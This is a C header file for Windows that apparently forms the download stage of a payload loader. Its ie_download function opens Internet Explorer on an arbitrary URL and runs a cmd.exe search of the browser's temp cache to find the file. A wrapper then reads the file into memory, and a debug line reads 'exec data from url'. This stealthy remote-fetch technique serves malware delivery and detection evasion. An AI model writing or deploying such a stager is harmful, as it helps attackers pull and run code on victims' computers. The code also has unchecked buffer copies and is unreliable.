#pragma once

#include <stdio.h>
#include <windows.h>
#include "../../debug_print/debug_print.h"


static int get_filesize(char *fvalue)
{
	int size,rc1;
	FILE *fp1 = fopen(fvalue, "rb");
	if (fp1 == NULL)
	{
		printf("get_filesize, %s not found\n", fvalue);
		return 0;
	}
	for (size = 0; (rc1 = getc(fp1)) != EOF; size++) {}
	fclose(fp1);
	
	DEBUG_PRINT(("get_filesize, filesize %s: %d\n", fvalue, size));
	
	return size;
}


// Returns pointer to buffer that contains the file content
// Automatically allocates memory for this
unsigned char *load_textfile(char *fvalue, int size)
{
	DEBUG_PRINT(("load_textfile called: fvalue: %s, size: %d\n", fvalue, size));
	
	//allocate buffer, open file, read file to the buffer, close the file
	unsigned char *buffer = (unsigned char*) malloc(size+1);
	int i, rc;

	for (i=0; i<size; i++)
		buffer[i]=0x0;

	FILE *fp = fopen(fvalue, "rb");
	if (fp == NULL)
	{
		printf("load_textfile, %s not found\n", fvalue);
		return 0;
	}

	for (i=0; i<size; i++)
	{
		rc = getc(fp);
		buffer[i] = rc;
	}

	DEBUG_PRINT(("%s\n",buffer));
	
	fclose(fp);	
	return buffer;
}


// return pointer to the filename
// string = url
char* ie_download(char* string)
{
	char ie[500];
	GetEnvironmentVariable("PROGRAMFILES",ie,100);
	strcat(ie,"\\Internet Explorer\\iexplore.exe");
	ShellExecute(0, "open", ie , string, NULL, SW_SHOWDEFAULT);

	// wait a little until the file is loaded
	Sleep(8000);

	// get the filename to search format in the ie temp directory
	char delimiter[] = "/";
	char *ptr;
	char *fname;
	ptr = strtok(string, delimiter);
	while(ptr != NULL)
	{
		fname = ptr;
		ptr = strtok(NULL, delimiter);
	}

	DEBUG_PRINT(("ie_download, filename: %s\n", fname));
	
	// split the filename
	char delimiter2[] = ".";
	char *sname;
	ptr = strtok(fname, delimiter2);
	sname = ptr;
	ptr = strtok(NULL, delimiter2);

	DEBUG_PRINT(("ie_download, name to search for: %s\n", sname));
	
	// search for the file in user profile

	// build searchstring
	char tmp[150];
	char tmp_home[150];
	GetEnvironmentVariable ("USERPROFILE",tmp_home,150);
	GetEnvironmentVariable ("TEMP",tmp,150);
	tmp [ strlen(tmp) - 5 ] = 0x0;
	//printf("\n\n%s\n\n",tmp);
	char searchstring[500] = "/C ";
	strncat (searchstring,tmp_home,1);
	strcat (searchstring,": && cd \"");
	strcat (searchstring,tmp);
	strcat (searchstring,"\" && dir . /s /b | find \"");
	strcat (searchstring,sname);
	strcat (searchstring,"\" > \"");
	strcat (searchstring,tmp_home);
	strcat (searchstring,"\\datafile.txt\"");
	
	DEBUG_PRINT(("ie_download, searchstring: %s\n", searchstring));
	
	// build & execute cmd
	char cmd[500];
	GetEnvironmentVariable ("WINDIR",cmd,500);
	strcat (cmd,"\\system32\\cmd.exe");
	ShellExecute (0, "open", "cmd.exe" , searchstring, NULL, SW_SHOWDEFAULT);

	//now read the directory + filename from the textfile
	char dirfile[500] = {0};
	strcat (dirfile, tmp_home);
	strcat (dirfile, "\\datafile.txt");
	char *sh_filename;
	int size_sh_filename=0;
	int counter = 0;
	while(size_sh_filename==0 && counter <= 1000)
	{
		size_sh_filename = get_filesize (dirfile);
		Sleep(500);
		counter++;
	}

	sh_filename = load_textfile (dirfile, size_sh_filename);
	// there is always emtpy space at the end of the file -> delete that
	sh_filename[size_sh_filename-2]=0x0;
	
	DEBUG_PRINT(("ie_download, sh_filename: >>>%s<<<, size: %d\ntest\n", sh_filename, size_sh_filename));
	
	return sh_filename;
}


// Retrieval of data via IE download to file. The data is then read from the file and returned.
//
// arg1 specifies the URL to download the file from.
// data_size receives the size of the data in bytes.
unsigned char* download_internet_explorer(char *arg1, int *data_size) {
    DEBUG_PRINT(("This is download_internet_explorer.\n"));
	DEBUG_PRINT(("exec data from url\n"));
		
	char *sh_filename = ie_download(arg1);
	*data_size = get_filesize(sh_filename);	
	return load_textfile(sh_filename, *data_size);
}
